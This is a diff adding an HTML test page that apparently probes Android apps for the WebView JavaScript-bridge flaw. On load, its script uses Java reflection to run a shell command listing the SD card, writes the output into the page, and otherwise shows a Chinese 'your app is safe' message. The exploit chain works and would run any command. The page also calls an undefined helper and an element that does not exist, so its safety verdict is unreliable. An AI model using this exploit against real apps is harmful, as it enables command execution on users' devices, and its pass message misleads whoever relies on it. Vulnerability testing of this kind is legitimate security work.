@@ -1,0 +1,40 @@
+<html>
+<head>
+<meta charset="utf-8">
+<!--[if lte IE 6]></base><![endif]-->
+<title>hello changba</title>
+
+<script type="text/javascript">
+
+function check()
+{
+
+	var res = 0;
+
+	for (var obj in window) 
+	{
+		try {
+			if ("getClass" in window[obj]) {
+				try{
+          var res = window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
+          document.write(getContents(res.getInputStream()));
+					res = 1;
+					break;
+				}catch(e){
+				}	
+			}
+		} catch(e) {
+		}
+	}
+
+	if(res==0)
+	{
+		document.getElementById("res_show").innerHTML = "<b><font color='green' size=6>恭喜！您当前的APP不存在Andriod WebView 挂马漏洞！请放心使用！</font></b>";
+	}
+}
+</script>
+</head>
+<body onload="check();">
+</body>
+</html>
+
